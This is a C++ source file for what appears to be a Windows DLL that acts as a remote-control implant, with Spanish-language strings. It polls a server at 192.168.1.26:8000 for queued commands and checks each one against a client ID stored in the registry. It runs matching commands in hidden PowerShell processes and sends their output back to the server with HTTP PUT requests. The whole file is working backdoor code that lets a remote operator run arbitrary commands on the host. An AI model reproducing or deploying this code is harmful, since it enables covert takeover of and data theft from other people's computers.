
#include "pch.h"
#include <windows.h>
#include <string>
#include <sstream>
#include <nlohmann/json.hpp>

#include "utils.h"


#include <nlohmann/json.hpp>
using json = nlohmann::json;


void executeCommands() {
    std::string output1;
    const char* cmd2 = "powershell.exe -Command \"Invoke-WebRequest -Uri 'http://192.168.1.26:8000/commands/' -UseBasicParsing | Select-Object -ExpandProperty Content\"";
    ExecuteCommandHidden(cmd2, output1);

    auto jsonArray = json::parse(output1);

    if (jsonArray.empty()) {
        return;
    }

    for (const auto& item : jsonArray) {
        int clientIdPetition = item["client_id"].get<int>();
        std::string command = item["command"].get<std::string>();
        int idCommand = item["id"].get<int>();
        char clientId[256];
        DWORD clientIdSize = sizeof(clientId);

        if (GetRegistryValue(HKEY_CURRENT_USER, "Software\\MiAplicacion", "ClientID", REG_SZ, (BYTE*)clientId, &clientIdSize)) {
            std::string clientIdStr = clientId;
            std::string clientIdPetitionStr = std::to_string(clientIdPetition);

            if (clientIdPetitionStr == clientIdStr) {
                std::string formattedCommand = "powershell.exe -Command \"" + command + "\"";
                std::string commandOutput;
                ExecuteCommandHidden(formattedCommand.c_str(), commandOutput);

                std::string escapedCommandOutput;
                for (char c : commandOutput) {
                    if (c == '\"') escapedCommandOutput += "\\\"";
                    else if (c == '\\') escapedCommandOutput += "\\\\";
                    else if (c >= 32 && c <= 126) escapedCommandOutput += c;
                }
                MessageBoxA(NULL, "Comando ejecutado!", "Output", MB_ICONINFORMATION);

                std::stringstream ss;
                ss << idCommand;
                std::string strIdCommand = ss.str();

                std::string jsonBody = "{\\\"executed\\\": true, \\\"result\\\": \\\"" + escapedCommandOutput + "\\\"}";
                std::string cmd = "powershell.exe -Command \"$body = '" + jsonBody + "';Invoke-WebRequest -Uri 'http://192.168.1.26:8000/commands/" + strIdCommand + "' -Method PUT -Body $body -ContentType 'application/json' -UseBasicParsing\"";
                std::string putCommandOutput;
                ExecuteCommandHidden(cmd.c_str(), putCommandOutput);

               
            }
        }
    }
}